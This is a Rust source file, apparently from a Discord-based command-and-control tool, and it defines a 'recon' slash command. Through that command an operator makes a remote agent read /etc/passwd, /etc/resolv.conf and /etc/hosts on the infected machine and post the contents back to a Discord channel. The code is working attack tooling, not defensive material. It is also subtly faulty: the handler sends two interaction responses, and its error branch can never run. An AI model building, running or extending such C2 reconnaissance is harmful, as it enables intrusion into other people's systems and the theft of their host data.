use crate::{
    commands::shell::{download, exit},
    discord_utils::bot_functions::{
        send_channel_message, send_code_message, send_ephemeral_response,
    },
    discord_utils::channels::create_text_channel,
    errors::DiscordC2Error,
    os::process_handler::{ProcessHandler, ShellType},
    utils::agent::get_or_create_agent,
};

use serenity::{
    builder::CreateApplicationCommand,
    client::Context,
    model::application::{
        command::{Command, CommandOptionType},
        interaction::application_command::{
            ApplicationCommandInteraction, CommandDataOption, CommandDataOptionValue,
        },
    },
    model::prelude::Message,
};

use anyhow::Error;
use chrono::Utc;
use lazy_static::lazy_static;
use serenity::futures::TryFutureExt;
use serenity::model::application::interaction::InteractionResponseType;
use serenity::model::channel::AttachmentType;
use tokio::sync::Mutex;
use tracing::{info as informational, warn, error};
use crate::os::recon_utils::{get_etc_hosts, get_etc_passwd, get_resolv_conf};

pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
    // Register the recon command
    command
        .name("recon")
        .description("Performs various recon operations/commands with the agent.")
        .create_option(|option| {
            option
                .name("recon-type")
                .kind(CommandOptionType::String)
                .description("The type of recon to perform.")
                .add_string_choice("Read /etc/passwd", "Read /etc/passwd")
                .add_string_choice("Read /etc/resolv.conf", "Read /etc/resolv.conf")
                .add_string_choice("Read /etc/hosts", "Read /etc/hosts")
                .required(true)
        });
    command
}

pub async fn run(options: &[CommandDataOption]) -> Result<String, DiscordC2Error> {
    let options = options.to_owned();

    let operation = options.get(0)
        .ok_or(DiscordC2Error::InternalError("Expected recon operation at index 0".to_string()))?
        .resolved
        .as_ref()
        .ok_or(DiscordC2Error::InternalError("Expected valid recon operation".to_string()))?;

    if let CommandDataOptionValue::String(operation) = operation {
        match operation.as_str() {
            "Read /etc/passwd" => {
                Ok(get_etc_passwd().await)
            }
            "Read /etc/resolv.conf" => {
                Ok(get_resolv_conf().await)
            }
            "Read /etc/hosts" => {
                Ok(get_etc_hosts().await)
            }
            _ => {
                Err(DiscordC2Error::InvalidInput("Invalid recon operation.".to_string()))
            }
        }
    } else {
        Err(DiscordC2Error::InvalidInput("Invalid recon operation.".to_string()))
    }
}

pub async fn recon_handler(ctx: &Context, command: &ApplicationCommandInteraction) -> Result<(), DiscordC2Error> {
    let response = send_interaction_response(
        ctx,
        command,
        "Executing operation...").await?;
    let operation = run(&command.data.options).await;

    command.create_interaction_response(&ctx.http, |response| {
        response
            .kind(InteractionResponseType::ChannelMessageWithSource)
            .interaction_response_data(|message| {
                if let recon_output = operation {
                    message.content(recon_output.unwrap());
                } else {
                    message.content("Failed to execute operation");
                }
                message
            })
    }).await?;

    Ok(())
}

async fn send_interaction_response<'a, T>(
    ctx: &'a Context,
    command: &'a ApplicationCommandInteraction,
    content: T,
) -> Result<ApplicationCommandInteraction, DiscordC2Error>
    where
        T: AsRef<str> + 'a,
{
    command
        .create_interaction_response(&ctx.http, |response| {
            response
                .kind(InteractionResponseType::ChannelMessageWithSource)
                .interaction_response_data(|message| {
                    message.content(content.as_ref());

                    message
                })
        })
        .await?;
    Ok(command.to_owned())
}